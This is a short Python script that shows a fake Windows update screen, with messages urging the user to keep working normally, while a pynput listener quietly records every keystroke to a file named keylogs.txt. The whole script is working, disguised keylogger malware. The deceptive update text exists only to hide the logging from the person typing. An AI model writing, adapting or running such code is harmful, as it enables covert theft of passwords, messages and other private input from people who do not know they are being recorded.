print ("Windows Is Updating Please Wait.")
print ("Checking C:")
print ("Making Sure C: Have The Storage.")
print ("Instaling Stuff From Microsoft Upgrade.")
print ("Installing Please Minimize or Continue With Your Work And Normal Activities.")
print ("Updating Stuff Please Wait.")
print ("8397428")
print ("Use The Code Above To Verify You are A Human.")
print ("Cheking For Viruses.")
print ("updating Packages.")
print ("")
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()